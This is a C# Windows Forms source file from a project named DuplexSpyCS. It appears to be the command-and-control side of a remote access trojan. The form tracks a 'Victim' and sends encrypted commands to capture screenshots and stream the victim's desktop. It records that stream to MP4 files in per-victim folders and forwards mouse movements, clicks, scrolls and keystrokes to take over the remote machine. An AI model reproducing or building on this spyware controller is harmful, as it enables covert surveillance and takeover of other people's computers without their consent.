using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using OpenCvSharp;

namespace DuplexSpyCS
{
    public partial class frmDesktop : Form
    {
        private static IniManager ini_manager = C2.ini_manager;

        private struct DesktopConfig
        {
            public DesktopConfig()
            {
                DisplayQuality = int.Parse(ini_manager.Read("Desktop", "quality"));
            }

            public int DisplayQuality;
        }

        public Victim v;
        private Dictionary<string, Dictionary<string, int>> monitor_info = new Dictionary<string, Dictionary<string, int>>();
        private Label fps_label = new Label();
        private bool capture = false;

        //RECORD
        private ImageWriter imgWriter;
        private int mp4FrameRate = 30;
        private bool isProcessing = false;

        private VideoWriter videoWriter;
        private SemaphoreSlim fileLock;

        private int fps_cnt = 0;
        private DateTime fps_last_time;
        private TimeSpan fps_span;

        public frmDesktop()
        {
            InitializeComponent();
        }

        private Bitmap Base64ToBitmap(string b64_str)
        {
            byte[] image_bytes = Convert.FromBase64String(b64_str);
            using (MemoryStream ms = new MemoryStream(image_bytes))
            {
                return new Bitmap(ms);
            }
        }

        public async void ShowImage(string b64_img, string szDatetime)
        {
            if (isProcessing)
                return;

            isProcessing = true;
            try
            {
                bool record = false;
                Bitmap bitmap = Base64ToBitmap(b64_img);
                Invoke(new Action(() =>
                {
                    pictureBox1.Image = bitmap;
                    record = toolStripButton7.Checked;
                }));
                fps_cnt++;

                if (record)
                {
                    int img_width = bitmap.Size.Width;
                    int img_height = bitmap.Size.Height;
                    string mp4_file = Path.Combine(new string[]
                    {
                        v.dir_victim,
                        "Monitor",
                        C1.GenerateFileName("mp4"),
                    });

                    //INIT VIDEO WRITER
                    if (videoWriter == null)
                    {
                        videoWriter = new VideoWriter(mp4_file, FourCC.MP4V, 10, new OpenCvSharp.Size(img_width, img_height));
                        fileLock = new SemaphoreSlim(1, 1);
                    }

                    await Task.Run(async () =>
                    {
                        await fileLock.WaitAsync();

                        Invoke(new Action(() =>
                        {
                            try
                            {
                                Bitmap bitmapCopy = null;
                                try
                                {
                                    lock (bitmap)
                                    {
                                        bitmapCopy = new Bitmap(bitmap);
                                    }
                                }
                                catch (InvalidOperationException ex)
                                {

                                }

                                try
                                {
                                    if (bitmapCopy == null)
                                        return;

                                    using (var frame = BitmapToMat(bitmapCopy))
                                    {
                                        if (frame.Width != img_width || frame.Height != img_height)
                                        {
                                            Cv2.Resize(frame, frame, new OpenCvSharp.Size(img_width, img_height));
                                        }

                                        Cv2.PutText(
                                            frame,
                                            szDatetime,
                                            new OpenCvSharp.Point(30, 30),
                                            HersheyFonts.HersheySimplex,
                                            1.0,
                                            Scalar.White,
                                            2,
                                            LineTypes.AntiAlias
                                        );

                                        if (videoWriter.IsOpened())
                                        {
                                            Invoke(new Action(() =>
                                            {
                                                videoWriter.Write(frame);
                                            }));
                                        }
                                        else
                                        {

                                        }
                                    }
                                }
                                catch (Exception ex)
                                {

                                }
                                finally
                                {
                                    if (bitmapCopy != null)
                                        bitmapCopy.Dispose();
                                }
                            }
                            catch (Exception ex)
                            {

                            }
                            finally
                            {
                                fileLock.Release();
                            }
                        }));
                    });
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
            finally
            {
                isProcessing = false;
            }
        }
        private Mat BitmapToMat(Bitmap bitmap)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
                ms.Seek(0, SeekOrigin.Begin);

                return Cv2.ImDecode(ms.ToArray(), ImreadModes.Color);
            }
        }

        public void Init(string payload)
        {
            foreach (string monitor in payload.Split("+"))
            {
                string[] info = monitor.Split(",");
                monitor_info.Add(info[0], new Dictionary<string, int>()
                {
                    { "left" , int.Parse(info[1]) },
                    { "top" , int.Parse(info[2]) },
                    { "width", int.Parse(info[3]) },
                    { "height", int.Parse(info[4]) },
                });
                Invoke(new Action(() =>
                {
                    toolStripComboBox1.Items.Add(info[0]);
                }));
            }
            Invoke(new Action(() =>
            {
                if (toolStripComboBox1.Items.Count > 0)
                    toolStripComboBox1.SelectedIndex = 0;
            }));
        }

        /// <summary>
        /// Send screen shot command.
        /// </summary>
        private void Screenshot()
        {
            if (monitor_info.Keys.Count == 0)
            {
                MessageBox.Show("No monitor found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            var dic = monitor_info[toolStripComboBox1.Text];
            v.encSend(2, 0, "desktop|screenshot|" + $"{toolStripComboBox1.Text},{dic["width"]},{dic["height"]}");
        }

        /// <summary>
        /// Send "start" command, do screen shot frequently.
        /// </summary>
        private void Start()
        {
            if (monitor_info.Keys.Count == 0)
            {
                MessageBox.Show("No monitor found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            var dic = monitor_info[toolStripComboBox1.Text];
            v.encSend(2, 0, "desktop|start|" + $"{toolStripComboBox1.Text},{dic["width"]},{dic["height"]}");
            capture = true;
            timer1.Start();
        }
        private void Stop()
        {
            if (monitor_info.Keys.Count == 0)
            {
                MessageBox.Show("No monitor found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            var dic = monitor_info[toolStripComboBox1.Text];
            v.encSend(2, 0, "desktop|stop");
        }

        void setup()
        {
            toolStripComboBox2.SelectedIndex = 1;

            fps_label.Text = string.Empty;
            fps_label.Location = new System.Drawing.Point(0, 0);
            fps_label.Font = new Font("Arial", 12, FontStyle.Bold);
            fps_label.BackColor = Color.Transparent;
            fps_label.ForeColor = Color.LimeGreen;

            pictureBox1.Controls.Add(fps_label);
            toolStripButton6.Checked = true;

            fps_last_time = DateTime.Now;

            v.encSend(2, 0, "desktop|init");
            timer1.Stop();

            pictureBox1.MouseWheel += PictureBox1_MouseWheel;
            pictureBox1.Image = Resources.Resource.NoSignal;
        }

        private void PictureBox1_MouseWheel(object? sender, MouseEventArgs e)
        {
            //throw new NotImplementedException();
            if (capture && toolStripButton4.Checked)
            {
                int amount = e.Delta;
                v.encSend(2, 0, "mouse|btn|SC|" + amount.ToString());
            }
        }

        private void frmDesktop_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {

        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {

        }

        private void frmDesktop_FormClosing(object sender, FormClosingEventArgs e)
        {
            v.encSend(2, 0, "desktop|stop");
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            //MOUSE
            if (toolStripButton4.Checked && capture)
            {
                if (pictureBox1.Image == null)
                    return;

                Image img = pictureBox1.Image;
                System.Drawing.Size pb_size = pictureBox1.ClientRectangle.Size;
                var wfactor = (double)img.Width / pictureBox1.ClientSize.Width;
                var hfactor = (double)img.Height / pictureBox1.ClientSize.Height;

                var resizeFactor = Math.Max(wfactor, hfactor);
                var imageSize = new System.Drawing.Size((int)(img.Width / resizeFactor), (int)(img.Height / resizeFactor));

                double pb_xMid = (double)pb_size.Width / 2;
                double pb_yMid = (double)pb_size.Height / 2;

                double screen_LB = pb_xMid - imageSize.Width / 2;
                double screen_RB = pb_xMid + imageSize.Width / 2;
                double screen_TB = pb_yMid - imageSize.Height / 2;
                double screen_BB = pb_yMid + imageSize.Height / 2;

                if (e.Location.X < screen_LB || e.Location.X > screen_RB) //X INVALID REGION
                    return;
                if (e.Location.Y < screen_TB || e.Location.Y > screen_BB)
                    return;

                int pb_width = pictureBox1.Size.Width;
                int pb_height = pictureBox1.Size.Height;

                var dic = monitor_info[toolStripComboBox1.Text];
                int tgt_width = dic["width"];
                int tgt_height = dic["height"];

                var tgt_wfactor = img.Width / (pictureBox1.ClientSize.Width - 2 * screen_LB);
                var tgt_hfactor = img.Height / (pictureBox1.ClientSize.Height - 2 * screen_TB);

                double loc_x = (e.Location.X - screen_LB) * tgt_wfactor;
                double loc_y = (e.Location.Y - screen_TB) * tgt_hfactor;

                v.encSend(2, 0, $"mouse|move|{(int)loc_x}|{(int)loc_y}");
            }
        }

        private void toolStripButton5_Click(object sender, EventArgs e)
        {

        }

        private void toolStripButton3_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void toolStripButton4_CheckedChanged(object sender, EventArgs e)
        {
            if (toolStripButton4.Checked)
            {

            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            DateTime date = DateTime.Now;
            fps_span = date - fps_last_time;
            if (fps_span.Seconds >= 1)
            {
                fps_label.ForeColor = fps_cnt >= 10 ? Color.LimeGreen : Color.Red;
                fps_label.Text = $"{fps_cnt} Hz";
                fps_cnt = 0;
                fps_last_time = date;
            }
        }

        private void toolStripButton6_CheckedChanged(object sender, EventArgs e)
        {
            if (toolStripButton6.Checked)
                fps_label.Show();
            else
                fps_label.Hide();
        }

        private void toolStripComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            var dic = monitor_info[toolStripComboBox1.Text];

            if (timer1.Enabled)
                v.encSend(2, 0, "desktop|start|" + $"{toolStripComboBox1.Text},{dic["width"]},{dic["height"]}");
        }

        private void frmDesktop_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (toolStripButton3.Checked)
                e.Handled = true;
        }

        private void frmDesktop_KeyDown(object sender, KeyEventArgs e)
        {
            //KEYBOARD
            if (toolStripButton3.Checked)
            {
                v.encSend(2, 0, "keyboard|vk|down|" + ((int)e.KeyCode).ToString());
            }
        }

        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            if (toolStripButton4.Checked)
            {
                string btn = string.Empty;
                if (e.Button == MouseButtons.Left) btn = "LD";
                else if (e.Button == MouseButtons.Right) btn = "RD";

                if (string.IsNullOrEmpty(btn))
                    return;

                v.encSend(2, 0, "mouse|btn|" + btn);
            }
        }

        private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            if (toolStripButton4.Checked)
            {
                string btn = string.Empty;
                if (e.Button == MouseButtons.Left) btn = "LU";
                else if (e.Button == MouseButtons.Right) btn = "RU";

                if (string.IsNullOrEmpty(btn))
                    return;

                v.encSend(2, 0, "mouse|btn|" + btn);
            }
        }

        private void frmDesktop_KeyUp(object sender, KeyEventArgs e)
        {
            if (toolStripButton3.Checked)
            {
                v.encSend(2, 0, "keyboard|vk|up|" + ((int)e.KeyCode).ToString());
            }
        }

        private void frmDesktop_Scroll(object sender, ScrollEventArgs e)
        {

        }

        private void pictureBox1_MouseClick(object sender, MouseEventArgs e)
        {

        }

        private void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
        {

        }

        private void toolStripButton8_Click(object sender, EventArgs e)
        {
            Image img = pictureBox1.Image;
            if (img == null)
            {
                MessageBox.Show("NULL", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            SaveFileDialog sfd = new SaveFileDialog();
            sfd.InitialDirectory = v.dir_victim;
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    img.Save(sfd.FileName);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void toolStripButton7_Click(object sender, EventArgs e)
        {

        }

        private void toolStripButton7_CheckedChanged(object sender, EventArgs e)
        {
            if (videoWriter == null)
                return;

            if (!toolStripButton7.Checked)
            {
                if (videoWriter.IsOpened())
                {
                    videoWriter.Release();
                    videoWriter = null;
                }
            }
        }

        //Screenshot
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Screenshot();
        }
        //Start
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            toolStripMenuItem2.Checked = true;
            toolStripMenuItem3.Checked = false;
            capture = true;

            Start();
        }
        //Stop
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            toolStripMenuItem2.Checked = false;
            toolStripMenuItem3.Checked = true;
            capture = false;

            Stop();
        }

        private void toolStripButton2_Click_1(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\Desktop").Show();
        }

        //Open Folder
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            string folder = Path.Combine(new string[] { v.dir_victim, "Monitor" });
            if (Directory.Exists(folder))
            {
                Process.Start("explorer.exe", folder);
            }
        }

        private void toolStripComboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (isProcessing && C1.IsPositiveNumber(toolStripComboBox2.Text))
            {
                v.SendCommand($"desktop|delay|{toolStripComboBox2.Text}");
            }
        }

        private void toolStripButton6_Click(object sender, EventArgs e)
        {

        }
    }
}
